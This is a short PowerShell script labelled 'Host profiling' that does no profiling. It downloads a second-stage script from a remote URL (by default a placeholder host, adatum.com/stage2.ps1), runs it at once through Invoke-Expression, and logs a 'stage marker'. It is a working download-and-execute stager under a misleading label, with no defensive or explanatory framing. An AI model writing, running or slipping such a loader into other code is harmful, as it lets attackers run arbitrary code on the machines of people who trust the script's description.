
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://adatum.com/stage2.ps1',
    [int]$TimeoutSec = 170
)
IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing).Content
Write-Verbose "stage marker 2 reached"
